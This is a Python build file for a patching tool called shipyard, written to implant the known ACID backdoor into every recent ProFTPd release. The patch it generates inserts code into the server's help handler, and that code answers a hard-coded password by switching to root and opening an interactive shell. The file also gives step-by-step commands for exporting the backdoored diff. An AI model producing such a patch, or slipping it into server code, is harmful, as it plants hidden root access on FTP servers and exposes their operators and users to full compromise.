"""
This file is meant to be used with https://github.com/micahjmartin/shipyard

Implement (and improve) the ACID backdoor on all versions of ProFTPd:
    https://www.aldeid.com/wiki/Exploits/proftpd-1.3.3c-backdoor
    https://www.exploit-db.com/exploits/15662

HOW TO USE

In the same directory as this file, run

    shipyard versions

Pick a version to patch and run

    shipyard build_version v1.5.3
    shipyard export >> patchfile.diff

You now have a patchfile. To build it, checkout the shipyard docs
"""

import re
from shipyard import CodePatch, EZ, Version


def c_func_sig(func: str) -> re.Pattern:
    """Generate an RE Pattern to match against a function signature. useful for just passing a function header and adding lines after.
    
    This RE will properly handle multiline function defs when used with EZ.reinsert.
    
    Note: Behavior is more finicky (and untested) when used with before=True"""
    function_header_re = r"((?P<type>\w+)[ \t]+)?(?P<fn>[^(\s]+)(?P<args>\(.*\))?"
    matches = re.match(function_header_re, func)
    if matches is None:
        raise ValueError(f"Could not parse function signature: {func}")
    fn_re = matches.group("fn")
    # If we have a return type in the passed arg, use it
    if matches.group("type"):
        fn_re = matches.group("type") + r"\s+" + fn_re

    # If we are given params, use them
    if matches.group("args"):
        fn_re += matches.group("args").replace("(", "\\(").replace(")", "\\)")
    else:
        fn_re += r"\(.*\)"
    fn_re += r"\s*{\s*\n"
    return re.compile(fn_re)

class Shipfile:
    Name = "proftpd-core"
    Url = "https://github.com/proftpd/proftpd"
    # The git tags that we care about. Pulled directly from the repo
    VersionTags = "v*"

    # Variables that we can update in the patches
    Variables = {
        '__PASSWORD__': 'ACIDBITCHEZ', # backdoor password
    }

    Package = "proftpd"
    '''
    If you want to use a CodePatch here is the function for it. It works on all
    versions.
    '''

    @staticmethod
    @CodePatch(".*/src/help.c")
    def backdoor(file, version: Version):
        """
        """
        
        acid = 'if (strcmp(target, "__PASSWORD__") == 0) { dup2(1,2); setuid(0); setgid(0); system("/bin/bash -i || /bin/sh"); }'
        with EZ(file) as f:
            f.reinsert(
                '#include "conf.h"\n',
                "#include <stdlib.h>\n#include <string.h>\n",
                err="Cannot add include statements",
            )
            f.reinsert(
                c_func_sig("int pr_help_add_response"),
                acid,
                err="Cannot find line to backdoor: {regex}",
            )

    @staticmethod
    def is_version_ignored(version: Version) -> bool:
        # Idk how old to go, but 1.3.6 came out in 2018, so we will just ignore everything before that
        if version < "1.3.6":
            return True
        return False
